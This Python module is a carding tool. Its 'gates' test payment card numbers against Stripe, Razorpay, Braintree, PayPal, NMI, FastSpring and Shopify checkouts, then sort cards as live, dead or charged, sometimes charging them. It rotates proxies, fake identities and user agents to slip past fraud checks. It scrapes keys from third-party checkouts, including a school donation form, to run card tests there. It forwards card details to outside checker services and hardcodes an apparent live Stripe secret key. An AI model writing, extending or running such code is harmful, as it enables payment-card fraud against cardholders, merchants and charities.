import asyncio
import stripe
import braintree
import razorpay
import aiohttp
import random
import re
import json
import uuid
from amazon_engine import AmazonEngine
from hitter_engine import StripeHitter
from bin_detector import get_bin_info as detect_bin
from sites import HQ_SITES, NORMAL_SITES, FREE_WOO_SITES
from us_address import get_random_address
from phone_gen import generate_phone_number
from ua_gen import get_random_ua
from config import (
    STRIPE_SK, BT_MERCHANT_ID, BT_PUBLIC_KEY, BT_PRIVATE_KEY,
    RZP_KEY_ID, RZP_KEY_SECRET, SHOPIFY_STORE, SHOPIFY_ACCESS_TOKEN,
    PAYU_MERCHANT_KEY, PAYU_MERCHANT_SALT, PROXY_URL,
    AMAZON_COOKIE, HITTER_URL, NMI_API, PAYFLOW_API,
    SHOPIFY_AUTH_API, VBV_API, PAYPAL_API, WOOSTRIPE_API,
    WOOSTRIPE_API_2, WOOSTRIPE_API_3, NONSK_API_1, NONSK_API_2, NONSK_API_3, NONSK_API_4, SAVVY_API,
    INBUILT_CVV_API, INBUILT_CCN_API, BT_AUTH_API, BT_AUTH2_API, BT_CHARGE_API, PAYPAL_KEYS
)
from sites import (
    FREE_WOO_SITES, PREMIUM_WOO_SITES,
    FREE_WOO_SITES_V1, FREE_WOO_SITES_V2, FREE_WOO_SITES_V3,
    PREMIUM_WOO_SITES_V1, PREMIUM_WOO_SITES_V2, PREMIUM_WOO_SITES_V3
)
from shopify_engine import check_shopify_native
from config import SHOPIFY_AUTH_API

# Initialize Stripe
stripe.api_key = STRIPE_SK

async def get_session(proxy=None):
    """Get aiohttp session with proxy support."""
    connector = None
    if proxy:
        # Assuming proxy is in format http://ip:port or http://user:pass@ip:port
        pass # aiohttp handles this in request
    return aiohttp.ClientSession()

async def check_stripe(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
    """Stripe Charge/Auth Gate"""
    if not STRIPE_SK:
        return {"status": "error", "response": "Stripe SK missing"}
        
    try:
        def call_stripe():
            # Set proxy for stripe library if provided
            if proxy:
                stripe.proxy = proxy
            
            try:
                # 1. Create PaymentMethod
                pm = stripe.PaymentMethod.create(
                    type="card",
                    card={"number": card, "exp_month": int(month), "exp_year": int(year), "cvc": cvv},
                )
                
                # 2. Try to Charge $1 (Optional - can be Auth only)
                # To make it "Charged", we create a PaymentIntent
                intent = stripe.PaymentIntent.create(
                    amount=100, # $1.00
                    currency="usd",
                    payment_method=pm.id,
                    confirm=True,
                    off_session=True,
                )
                
                if intent.status == "succeeded":
                    return {"status": "charged", "amount": "$1.00", "response": "$1.00 Charged Successfully 🔥", "gate": "Stripe"}
                return {"status": "live", "response": "Auth Success (No Charge)", "gate": "Stripe"}
                
            except stripe.error.CardError as e:
                return {"status": "dead", "response": e.user_message, "gate": "Stripe"}
            except Exception as e:
                # If charge fails but PM was created, it might still be LIVE
                return {"status": "live", "response": str(e), "gate": "Stripe"}

        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, call_stripe)
    except Exception as e:
        return {"status": "error", "response": str(e), "gate": "Stripe"}

async def check_shopify(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
    """Shopify Checkout Gate"""
    if not SHOPIFY_STORE:
        return {"status": "error", "response": "Shopify Store missing"}
        
    url = f"https://{SHOPIFY_STORE}/payments/config" # Example endpoint
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, proxy=proxy, timeout=10) as resp:
                # Real Shopify checking requires a complex checkout flow
                # This is a skeleton for the multi-step request
                return {"status": "declined", "response": "Shopify flow requires session cookies", "gate": "Shopify"}
    except Exception as e:
        return {"status": "error", "response": str(e), "gate": "Shopify"}

async def check_payu(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
    """PayU India Gate"""
    if not PAYU_MERCHANT_KEY:
        return {"status": "error", "response": "PayU Key missing"}
        
    # PayU requires a server-side hash for checking
    return {"status": "declined", "response": "PayU Hashing required", "gate": "PayU"}

async def check_razorpay(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
    """Razorpay Auth Gate - Creates order and validates card (No charge)"""
    if not RZP_KEY_ID or not RZP_KEY_SECRET:
        return {"status": "error", "response": "Razorpay keys missing", "gate": "Razorpay Auth"}
    
    try:
        def call_razorpay():
            client = razorpay.Client(auth=(RZP_KEY_ID, RZP_KEY_SECRET))
            
            # Create a minimum order (₹1)
            order = client.order.create({
                "amount": 100,  # 1 INR in paise
                "currency": "INR",
                "receipt": f"test_{random.randint(10000, 99999)}",
                "notes": {"purpose": "card_validation"}
            })
            
            # Create payment with card details (Auth only)
            payment_data = {
                "amount": 100,
                "currency": "INR",
                "email": f"test{random.randint(1000, 9999)}@test.com",
                "contact": f"+9199{random.randint(10000000, 99999999)}",
                "order_id": order["id"],
                "method": "card",
                "card": {
                    "number": card,
                    "expiry_month": month,
                    "expiry_year": year if len(year) == 4 else f"20{year}",
                    "cvv": cvv,
                    "name": "Test User"
                }
            }
            
            try:
                # Try to create payment
                payment = client.payment.create(payment_data)
                if payment.get("status") == "authorized":
                    return {"status": "approved", "response": "Card Authorized ✅", "gate": "Razorpay Auth"}
                if payment.get("status") == "captured":
                    return {"status": "charged", "response": "Payment Captured 🔥", "gate": "Razorpay Auth"}
                return {"status": "live", "response": f"Status: {payment.get('status')}", "gate": "Razorpay Auth"}
            except razorpay.errors.BadRequestError as e:
                error_msg = str(e)
                if "insufficient" in error_msg.lower():
                    return {"status": "live", "response": "Insufficient Funds ✅", "gate": "Razorpay Auth"}
                return {"status": "dead", "response": error_msg[:100], "gate": "Razorpay Auth"}
        
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, call_razorpay)
    except Exception as e:
        return {"status": "error", "response": str(e)[:100], "gate": "Razorpay Auth"}

async def check_razorpay_charge(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
    """Razorpay Charge Gate - Attempts actual charge (₹5 ~$0.06)"""
    if not RZP_KEY_ID or not RZP_KEY_SECRET:
        return {"status": "error", "response": "Razorpay keys missing", "gate": "Razorpay Charge"}
    
    try:
        def call_razorpay_charge():
            client = razorpay.Client(auth=(RZP_KEY_ID, RZP_KEY_SECRET))
            
            # Create charge order (₹5 = ~$0.06)
            order = client.order.create({
                "amount": 500,  # 5 INR in paise
                "currency": "INR", 
                "receipt": f"chg_{random.randint(10000, 99999)}",
                "notes": {"purpose": "charge_validation"}
            })
            
            payment_data = {
                "amount": 500,
                "currency": "INR",
                "email": f"charge{random.randint(1000, 9999)}@test.com",
                "contact": f"+9199{random.randint(10000000, 99999999)}",
                "order_id": order["id"],
                "method": "card",
                "card": {
                    "number": card,
                    "expiry_month": month,
                    "expiry_year": year if len(year) == 4 else f"20{year}",
                    "cvv": cvv,
                    "name": "Test User"
                }
            }
            
            try:
                payment = client.payment.create(payment_data)
                
                # If authorized, try to capture (this is the actual charge)
                if payment.get("status") == "authorized":
                    try:
                        captured = client.payment.capture(payment["id"], 500)
                        if captured.get("status") == "captured":
                            return {"status": "charged", "response": "₹5 Charged Successfully 🔥", "gate": "Razorpay Charge"}
                    except:
                        return {"status": "live", "response": "Auth OK, Capture Failed ✅", "gate": "Razorpay Charge"}
                
                if payment.get("status") == "captured":
                    return {"status": "charged", "response": "₹5 Charged 🔥", "gate": "Razorpay Charge"}
                    
                return {"status": "live", "response": f"Status: {payment.get('status')}", "gate": "Razorpay Charge"}
                
            except razorpay.errors.BadRequestError as e:
                error_msg = str(e)
                if "insufficient" in error_msg.lower():
                    return {"status": "live", "response": "Insufficient Funds ✅", "gate": "Razorpay Charge"}
                if "invalid" in error_msg.lower():
                    return {"status": "dead", "response": "Invalid Card", "gate": "Razorpay Charge"}
                return {"status": "dead", "response": error_msg[:100], "gate": "Razorpay Charge"}
        
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, call_razorpay_charge)
    except Exception as e:
        return {"status": "error", "response": str(e)[:100], "gate": "Razorpay Charge"}

async def check_braintree_auth(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
    """Braintree Auth Gate (Cyborx Port)"""
    dead_responses = {
        "Closed Card": "Closed Card", "Do Not Honor": "Do Not Honor",
        "Declined - Call Issuer": "Declined - Call Issuer",
        "Your payment method was rejected due to 3D Secure": "Rejected - 3D Secure",
        "Processor Declined": "Processor Declined", "Pick Up Card": "Pickup Card",
        "Gateway Rejected: fraud": "Gateway Rejected: Fraud", "No Account": "No Account",
        "Processor Declined - Fraud Suspected": "Processor Declined - Fraud Suspected",
        "Expired Card": "Expired Card", "Limit Exceeded": "Limit Exceeded",
        "Invalid Credit Card Number": "Invalid Credit Card Number",
        "Invalid Expiration Date": "Invalid Expiration Date",
        "Transaction Not Allowed": "Transaction Not Allowed",
        "risk_threshold": "RISK: Retry later"
    }
    url = f"{BT_AUTH_API}/?cc={card}|{month}|{year}|{cvv}"
    if proxy: url += f"&proxy={proxy}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=50) as resp:
                text = await resp.text()
                if any(x in text for x in ["Approved", "successfully added", "added to the vault"]):
                    return {"status": "approved", "response": "1000: Approved ✅", "gate": "Braintree Auth"}
                if "Insufficient Funds" in text:
                    return {"status": "live", "response": "Insufficient Funds ✅", "gate": "Braintree Auth"}
                for k, v in dead_responses.items():
                    if k in text: return {"status": "dead", "response": v, "gate": "Braintree Auth"}
                return {"status": "dead", "response": "Declined", "gate": "Braintree Auth"}
    except Exception as e:
        return {"status": "error", "response": str(e), "gate": "Braintree Auth"}

async def check_braintree_auth2(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
    """Braintree Auth 2 Gate (Cyborx Port)"""
    url = f"{BT_AUTH2_API}/?cc={card}|{month}|{year}|{cvv}"
    if proxy: url += f"&proxy={proxy}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=50) as resp:
                text = await resp.text()
                if any(x in text for x in ["Approved", "successfully added", "added to the vault"]):
                    return {"status": "approved", "response": "1000: Approved ✅", "gate": "Braintree Auth 2"}
                if "Insufficient Funds" in text:
                    return {"status": "live", "response": "Insufficient Funds ✅", "gate": "Braintree Auth 2"}
                return {"status": "dead", "response": "Declined", "gate": "Braintree Auth 2"}
    except Exception as e:
        return {"status": "error", "response": str(e), "gate": "Braintree Auth 2"}

async def check_braintree_charge(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
    """Braintree 0.3$ Charge Gate (Cyborx Port)"""
    url = f"{BT_CHARGE_API}/?cc={card}|{month}|{year}|{cvv}"
    if proxy: url += f"&proxy={proxy}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=50) as resp:
                text = await resp.text()
                if "Payment successful" in text:
                    return {"status": "charged", "amount": "$0.30", "response": "$0.30 Charged 🔥", "gate": "Braintree Charge"}
                if "Insufficient Funds" in text:
                    return {"status": "live", "response": "Insufficient Funds (Live) ✅", "gate": "Braintree Charge"}
                return {"status": "dead", "response": "Declined", "gate": "Braintree Charge"}
    except Exception as e:
        return {"status": "error", "response": str(e), "gate": "Braintree Charge"}

async def check_amazon(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
    """Amazon Pro Auth Gate (Cyborx Engine)"""
    if not AMAZON_COOKIE:
        return {"status": "error", "response": "AMAZON_COOKIE missing", "gate": "Amazon Pro"}
    
    engine = AmazonEngine(AMAZON_COOKIE, proxy=proxy)
    return await engine.check(card, month, year, cvv)

async def check_autohitter(card: str, month: str, year: str, cvv: str, proxy=None, checkout_url=None) -> dict:
    """PayCheckout Hitter Gate (Cyborx Port)"""
    hitter = StripeHitter(proxy=proxy)
    
    if checkout_url:
        # Step 0: Grab PK and CS from the checkout URL
        keys = await hitter.grab_keys(checkout_url)
        if not keys:
            return {"status": "error", "response": "Failed to extract Stripe keys from URL", "gate": "AutoHitter"}
        
        # Step 1: Hit the checkout using the standalone engine
        return await hitter.hit_checkout(card, month, year, cvv, keys['pk'], keys['cs'])
    
    # If no URL, use the centralized Cyborx Hitter API
    url = f"{HITTER_API}/?cc={card}|{month}|{year}|{cvv}"
    if proxy: url += f"&proxy={proxy}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=60) as resp:
                text = await resp.text()
                if '"status":"Success"' in text or "Payment Successful" in text:
                    return {"status": "charge", "response": "Payment Successful 🔥", "gate": "AutoHitter"}
                if "3DS Authentication" in text or "stripe_3ds2_fingerprint" in text:
                    return {"status": "live", "response": "3DS Required ✅", "gate": "AutoHitter"}
                return {"status": "dead", "response": "Declined", "gate": "AutoHitter"}
    except Exception as e:
        return {"status": "error", "response": str(e), "gate": "AutoHitter"}

async def check_stripe_autohitter_url(checkout_url: str, card: str, month: str, year: str, cvv: str, proxy: str = None) -> dict:
    """Automated Stripe Checkout Hitter (Port of Cyborx logic)"""
    hitter = StripeHitter(proxy=proxy)
    keys = await hitter.grab_keys(checkout_url)
    
    if not keys:
        return {"status": "error", "response": "Failed to extract keys from URL or Session Expired", "gate": "Checkout Hitter"}
        
    result = await hitter.hit_checkout(
        card, month, year, cvv, 
        pk=keys['pk'], 
        cs=keys['cs'], 
        amount=keys['amount'], 
        currency=keys['currency'], 
        email=keys['email']
    )
    return result

async def check_nmi(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
    """NMI 1$ Charge Gate (Cyborx Port)"""
    url = f"{NMI_API}/?cc={card}|{month}|{year}|{cvv}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, proxy=proxy, timeout=30) as resp:
                text = await resp.text()
                if "success" in text.lower():
                    return {"status": "charged", "amount": "$1.00", "response": "$1.00 Charged 🔥", "gate": "NMI"}
                if "Error: 225" in text or "Error: 202" in text:
                    return {"status": "live", "response": "Live (Low Balance/Mismatch) ✅", "gate": "NMI"}
                return {"status": "dead", "response": text[:100], "gate": "NMI"}
    except Exception as e:
        return {"status": "error", "response": str(e), "gate": "NMI"}

async def check_payflow(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
    """Payflow Pro Gate (Cyborx Port)"""
    url = f"{PAYFLOW_API}/?cc={card}|{month}|{year}|{cvv}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, proxy=proxy, timeout=30) as resp:
                text = await resp.text()
                if "COMPLETED" in text or "successful" in text:
                    return {"status": "charged", "amount": "~$1.00", "response": "~$1 Charged 🔥", "gate": "Payflow"}
                if "Mismatch" in text or "15004" in text:
                    return {"status": "live", "response": "CVV Mismatch (Live) ✅", "gate": "Payflow"}
                return {"status": "dead", "response": text[:100], "gate": "Payflow"}
    except Exception as e:
        return {"status": "error", "response": str(e), "gate": "Payflow"}

async def check_shopify_auth(card: str, month: str, year: str, cvv: str, proxy=None, site=None) -> dict:
    """Hybrid Shopify Gate: API (if set) -> Native (Fallback)"""
    if not site:
        site = random.choice(HQ_SITES)
    
    # 1. API MODE
    if SHOPIFY_AUTH_API and "babachecker.com" not in SHOPIFY_AUTH_API:  # Basic check to avoid dead default
        try:
            email = f"user{random.randint(1000,9999)}@gmail.com"
            url = f"{SHOPIFY_AUTH_API}?cc={card}|{month}|{year}|{cvv}&email={email}&site={site}&proxy={proxy if proxy else ''}"
            
            ua = get_random_ua()
            async with aiohttp.ClientSession() as session:
                headers = {"User-Agent": ua}
                async with session.get(url, timeout=60, headers=headers) as resp:
                    text = await resp.text()
                    if any(x in text for x in ["ORDER_PLACED", "Thank you", "success", "ProcessedReceipt"]):
                        return {"status": "charged", "amount": "$1-5", "response": "$1-5 Order Placed 🔥", "gate": "Shopify Auth API"}
                    if any(x in text for x in ["3DS_REQUIRED", "authentications", "3D CC"]):
                        return {"status": "live", "response": "3DS Required (Live) ✅", "gate": "Shopify Auth API"}
                    if "INCORRECT_CVC" in text or "INSUFFICIENT_FUNDS" in text:
                        return {"status": "live", "response": "CVC/Funds Issue (Live) ✅", "gate": "Shopify Auth API"}
                    # Fallback to native if API is weird, or just return dead. 
                    # Returning dead for now to trust API result.
                    return {"status": "dead", "response": "Declined (API)", "gate": "Shopify Auth API"}
        except:
             pass # Fallback to native on error

    # 2. NATIVE MODE (Fallback)
    return await check_shopify_native(card, month, year, cvv, proxy, site)

async def check_vbv(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
    """3DS VBV Lookup Gate (Cyborx Port)"""
    url = f"{VBV_API}/?cc={card}|{month}|{year}|{cvv}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, proxy=proxy, timeout=40) as resp:
                text = await resp.text()
                if any(x in text for x in ["authenticate_successful", "authenticate_attempt_successful", "authentication_unavailable"]):
                    return {"status": "approved", "response": "3DS Passed ✅", "gate": "VBV Pro"}
                return {"status": "dead", "response": "VBV Denied", "gate": "VBV Pro"}
    except Exception as e:
        return {"status": "error", "response": str(e), "gate": "VBV Pro"}

async def check_paypal(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
    """PayPal 1$ CVV Gate (Cyborx Port)"""
    url = f"{PAYPAL_API}/?cc={card}|{month}|{year}|{cvv}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, proxy=proxy, timeout=50) as resp:
                text = await resp.text()
                if any(x in text for x in ["COMPLETED", "Payment Successful"]):
                    return {"status": "charged", "amount": "$1.00", "response": "$1.00 Charged 🔥", "gate": "PayPal 1$"}
                if "CVV2_FAILURE" in text:
                    return {"status": "live", "response": "CVV2 Mismatch (Live) ✅", "gate": "PayPal 1$"}
                if "INSUFFICIENT_FUNDS" in text:
                    return {"status": "live", "response": "Insufficient Funds (Live) ✅", "gate": "PayPal 1$"}
                return {"status": "dead", "response": "Declined", "gate": "PayPal 1$"}
    except Exception as e:
        return {"status": "error", "response": str(e), "gate": "PayPal 1$"}

async def check_paypal_render(card: str, month: str, year: str, cvv: str, proxy=None) -> dict:
    """PayPal Render API Gate"""
    url = f"https://paypal0-1.onrender.com/gate=pp1/cc={card}|{month}|{year}|{cvv}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, proxy=proxy, timeout=60) as resp:
                try:
                    res_json = await resp.json()
                except:
                    text = await resp.text()
                    return {"status": "error", "response": text[:100], "gate": "PayPal Render"}
                
                status = res_json.get("status", "").lower()
                msg = res_json.get("message", "")
                code = res_json.get("code", "")
                
                if status in ["charged", "success", "succeeded"]:
                    return {"status": "charged", "amount": "$0.50", "response": "$0.50 Charged 🔥", "gate": "PayPal Render"}
                
                if status == "approved":
                    return {"status": "live", "response": "Approved (Auth) ✅", "gate": "PayPal Render"}
                
                if "insufficient" in msg.lower() or "insufficient" in code.lower():
                    return {"status": "live", "response": "Insufficient Funds ✅", "gate": "PayPal Render"}
                
                if "security code" in msg.lower() or "cvv" in msg.lower() or "cvc" in msg.lower():
                     return {"status": "live", "response": "CVV Mismatch (Live) ✅", "gate": "PayPal Render"}

                return {"status": "dead", "response": f"{msg} {code}".strip() or "Declined", "gate": "PayPal Render"}
    except Exception as e:
        return {"status": "error", "response": str(e), "gate": "PayPal Render"}

async def check_paypal_avs(card: str, month: str, year: str, cvv: str, proxy=None, client_id=None, client_secret=None) -> dict:
    """PayPal Key-Based AVS Gate (Cyborx Port)"""
    if not client_id or not client_secret:
        client_id, client_secret = random.choice(PAYPAL_KEYS)
    
    url = f"http://206.206.78.217:1355/?cc={card}|{month}|{year}|{cvv}&client_id={client_id}&client_secret={client_secret}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, proxy=proxy, timeout=50) as resp:
                text = await resp.text()
                if any(x in text for x in ["COMPLETED", "Payment successful"]):
                    return {"status": "charged", "amount": "$1.00", "response": "$1.00 Charged 🔥", "gate": "PayPal AVS"}
                if "CVV = D" in text or "0051" in text:
                    return {"status": "live", "response": "CVV/AVS Mismatch (Live) ✅", "gate": "PayPal AVS"}
                return {"status": "dead", "response": "Declined", "gate": "PayPal AVS"}
    except Exception as e:
        return {"status": "error", "response": str(e), "gate": "PayPal AVS"}

async def check_stripe_autowoo(card: str, month: str, year: str, cvv: str, proxy=None, variation=1) -> dict:
    """Auto WooStripe Auth Gate (Cyborx Port)"""
    api_map = {1: WOOSTRIPE_API, 2: WOOSTRIPE_API_2, 3: WOOSTRIPE_API_3}
    base_url = api_map.get(variation, WOOSTRIPE_API)
    
    # Use specific site lists if available
    site_lists = {
        1: FREE_WOO_SITES_V1,
        2: FREE_WOO_SITES_V2,
        3: FREE_WOO_SITES_V3
    }
    site_list = site_lists.get(variation, FREE_WOO_SITES)
    site = random.choice(site_list)
    
    url = f"{base_url}/?cc={card}|{month}|{year}|{cvv}&getSite={site}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, proxy=proxy, timeout=50) as resp:
                text = await resp.text()
                if any(x in text for x in ["requires_action", "insufficient_funds", "incorrect_cvc"]):
                    return {"status": "live", "response": text[:50], "gate": f"WooStripe V{variation}"}
                return {"status": "dead", "response": "Declined", "gate": f"WooStripe V{variation}"}
    except Exception as e:
        return {"status": "error", "response": str(e), "gate": f"WooStripe V{variation}"}

async def check_fastspring_auth(card: str, month: str, year: str, cvv: str, proxy: str = None) -> dict:
    """FastSpring Auth Gate - Antares Tech (Cyborx Port)"""
    if len(year) == 2: year = "20" + year
    month = month.zfill(2)
    
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    email = f"user{random.randint(10000, 99999)}@gmail.com"
    fname, lname = "John", "Doe"
    zip_code = str(random.randint(10000, 99999))
    
    headers = {"User-Agent": ua, "Accept": "application/json"}
    jar = aiohttp.CookieJar(unsafe=True)
    
    async with aiohttp.ClientSession(cookie_jar=jar) as session:
        try:
            # 1. Get Client IP (Simulated or via endpoint)
            async with session.get("https://cms.antarestech.com/wp-json/antares/v1/get_client_ip", proxy=proxy) as resp:
                client_ip = await resp.text()
            
            # 2. Verify Email
            v_data = {"email": email, "cache_key": "63c5c9be"}
            await session.post("https://www.antarestech.com/laravel/rest/verify", json=v_data, proxy=proxy)
            
            # 3. Get FS Builder Serial
            builder_url = "https://antarestech.onfastspring.com/embedded-production/builder"
            p_data = {
                "put": json.dumps({
                    "items": [{"path": "auto-tune-unlimited-monthly-14d-free", "quantity": 1}],
                    "tags": {"user_checkout_email": email, "optin_marketing": True},
                    "paymentContact": {"firstName": fname, "lastName": lname, "email": email, "postalCode": zip_code},
                    "language": "en", "sblVersion": "0.9.1"
                })
            }
            async with session.post(builder_url, data=p_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, proxy=proxy) as resp:
                res_text = await resp.text()
                serial = re.search(r'"serial":"([^"]+)"', res_text)
                if not serial: return {"status": "error", "response": "Failed to get FS serial", "gate": "FastSpring Auth"}
                serial = serial.group(1)
            
            # 4. Finalize
            f_data = {"put": json.dumps({"origin": "https://www.antarestech.com/checkout", "sblVersion": "0.9.1"}), "session": serial}
            async with session.post(f"{builder_url}/finalize", data=f_data, proxy=proxy) as resp:
                res_json = await resp.json()
                fs_session = res_json.get("session")
                red_url = res_json.get("url")
            
            # 5. Get Session Token
            async with session.get(red_url, proxy=proxy) as resp:
                page_text = await resp.text()
                token = re.search(r'"token":"([^"]+)"', page_text)
                if not token: return {"status": "error", "response": "Failed to get FS token", "gate": "FastSpring Auth"}
                token = token.group(1)
            
            # 6. Submit Payment
            pay_url = f"https://antarestech.onfastspring.com/embedded-production/session/{fs_session}/payment"
            pay_data = {
                "contact": {"email": email, "country": "US", "firstName": fname, "lastName": lname, "postalCode": zip_code, "region": "NY"},
                "card": {"year": year, "month": month, "number": card, "security": cvv},
                "paymentType": "card", "autoRenew": True, "subscribe": True
            }
            async with session.post(pay_url, json=pay_data, headers={"x-session-token": token}, proxy=proxy) as resp:
                res_pay = await resp.text()
                if "/complete" in res_pay:
                    return {"status": "approved", "response": "Trial Started Successfully ✅", "gate": "FastSpring Auth"}
                if "url3ds" in res_pay:
                    return {"status": "live", "response": "3DS Required ✅", "gate": "FastSpring Auth"}
                
                msg = re.search(r'"phrase":"([^"]+)"', res_pay)
                return {"status": "dead", "response": msg.group(1) if msg else "Declined", "gate": "FastSpring Auth"}
                
        except Exception as e:
            return {"status": "error", "response": str(e), "gate": "FastSpring Auth"}

async def check_fastspring_charge(card: str, month: str, year: str, cvv: str, proxy: str = None) -> dict:
    """FastSpring Charge Gate - DaisyDisk (Cyborx Port)"""
    if len(year) == 2: year = "20" + year
    month = month.zfill(2)
    
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    email = f"user{random.randint(10000, 99999)}@gmail.com"
    fname, lname = "John", "Doe"
    zip_code = str(random.randint(10000, 99999))
    
    jar = aiohttp.CookieJar(unsafe=True)
    async with aiohttp.ClientSession(cookie_jar=jar) as session:
        try:
            # 1. Get Token from store
            async with session.get("https://daisydisk.onfastspring.com/daisydisk", proxy=proxy) as resp:
                page_text = await resp.text()
                token = re.search(r'"token":"([^"]+)"', page_text)
                if not token: return {"status": "error", "response": "Failed to get store token", "gate": "FastSpring Charge"}
                token = token.group(1)
            
            # 2. Submit Payment ($10 Charge)
            pay_url = "https://daisydisk.onfastspring.com/session/daisydisk/payment"
            pay_data = {
                "contact": {"email": email, "country": "US", "firstName": fname, "lastName": lname, "postalCode": zip_code, "region": "NY"},
                "card": {"year": year[-2:], "month": month, "number": card, "security": cvv},
                "paymentType": "card", "subscribe": True
            }
            async with session.post(pay_url, json=pay_data, headers={"x-session-token": token, "User-Agent": ua}, proxy=proxy) as resp:
                res_pay = await resp.text()
                if "/complete" in res_pay:
                    return {"status": "charged", "amount": "$10", "response": "$10 Charged 🔥", "gate": "FastSpring Charge"}
                if "url3ds" in res_pay:
                    return {"status": "live", "response": "3DS Required (Live) ✅", "gate": "FastSpring Charge"}
                
                msg = re.search(r'"phrase":"([^"]+)"', res_pay)
                return {"status": "dead", "response": msg.group(1) if msg else "Declined", "gate": "FastSpring Charge"}
                
        except Exception as e:
            return {"status": "error", "response": str(e), "gate": "FastSpring Charge"}

async def check_killer_gate(card: str, month: str, year: str, cvv: str, proxy: str = None) -> dict:
    """Killer Gate - Card Elimination (Cyborx Port)"""
    if len(year) == 2: year = "20" + year
    month = month.zfill(2)
    exp_date = month + year[-2:]
    
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    headers = {"User-Agent": ua}
    
    jar = aiohttp.CookieJar(unsafe=True)
    async with aiohttp.ClientSession(cookie_jar=jar) as session:
        try:
            # 1. Fetch Form Hash and Authorize.net Keys
            url1 = "https://sechristianschool.org/cheerful-giving-year-end-campaign/?form-id=1940&payment-mode=authorize&level-id=3"
            async with session.get(url1, headers=headers, proxy=proxy) as resp:
                text = await resp.text()
                hash_val = re.search(r'name="give-form-hash" value="([^"]+)"', text)
                client_key = re.search(r'authData.clientKey = "([^"]+)"', text)
                api_login = re.search(r'authData.apiLoginID = "([^"]+)"', text)
                
                if not all([hash_val, client_key, api_login]):
                    return {"status": "error", "response": "Failed to extract session keys", "gate": "Killer Gate"}
                
                hash_val = hash_val.group(1)
                client_key = client_key.group(1)
                api_login = api_login.group(1)

            # 2. Tokenize via Authorize.net
            auth_url = "https://api2.authorize.net/xml/v1/request.api"
            auth_data = {
                "securePaymentContainerRequest": {
                    "merchantAuthentication": {"name": api_login, "clientKey": client_key},
                    "data": {
                        "type": "TOKEN",
                        "id": str(uuid.uuid4()),
                        "token": {"cardNumber": card, "expirationDate": exp_date, "cardCode": cvv}
                    }
                }
            }
            async with session.post(auth_url, json=auth_data, headers=headers, proxy=proxy) as resp:
                res_text = await resp.text()
                data_desc = re.search(r'"dataDescriptor":"([^"]+)"', res_text)
                data_val = re.search(r'"dataValue":"([^"]+)"', res_text)
                
                if not all([data_desc, data_val]):
                    return {"status": "error", "response": "Failed to tokenize card", "gate": "Killer Gate"}
                
                data_desc = data_desc.group(1)
                data_val = data_val.group(1)

            # 3. Final Submission
            fname, lname = "John", "Doe"
            zip_code = str(random.randint(10000, 99999))
            pay_data = {
                "give-honeypot": "",
                "give-form-id-prefix": "1940-1",
                "give-form-id": "1940",
                "give-form-title": "Cheerful Giving Year End Donation",
                "give-current-url": "https://sechristianschool.org/cheerful-giving-year-end-campaign/",
                "give-form-url": "https://sechristianschool.org/cheerful-giving-year-end-campaign/",
                "give-form-minimum": "5.00",
                "give-form-maximum": "999999.99",
                "give-form-hash": hash_val,
                "give-price-id": "custom",
                "give-amount": str(random.randint(5, 50)),
                "payment-mode": "authorize",
                "give_first": fname,
                "give_last": lname,
                "give_email": f"{fname.lower()}{random.randint(100, 999)}@gmail.com",
                "billing_country": "US",
                "card_address": "Street " + str(random.randint(100, 999)),
                "card_city": "New York",
                "card_state": "NY",
                "card_zip": zip_code,
                "give_authorize_data_descriptor": data_desc,
                "give_authorize_data_value": data_val,
                "give_action": "purchase",
                "give-gateway": "authorize"
            }
            
            submit_url = "https://sechristianschool.org/cheerful-giving-year-end-campaign/?payment-mode=authorize&form-id=1940"
            async with session.post(submit_url, data=pay_data, headers=headers, proxy=proxy) as resp:
                res_final = await resp.text()
                if "was declined" in res_final or "Insufficient funds" in res_final:
                    return {"status": "approved", "response": "Card Eliminated ✅", "gate": "Killer Gate"}
                
                err = re.search(r'<strong>Error</strong>([^<]+)', res_final)
                return {"status": "dead", "response": err.group(1).strip() if err else "Declined", "gate": "Killer Gate"}

        except Exception as e:
            return {"status": "error", "response": str(e), "gate": "Killer Gate"}
async def check_stripe_sk(card: str, month: str, year: str, cvv: str, proxy=None, sk=None, ccn=False) -> dict:
    """Stripe SK-Based Gate (Cyborx Port)"""
    if not sk:
        sk = STRIPE_SK or "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"
    
    charge_type = "ccn" if ccn else "cvv"
    # Savvy API endpoint
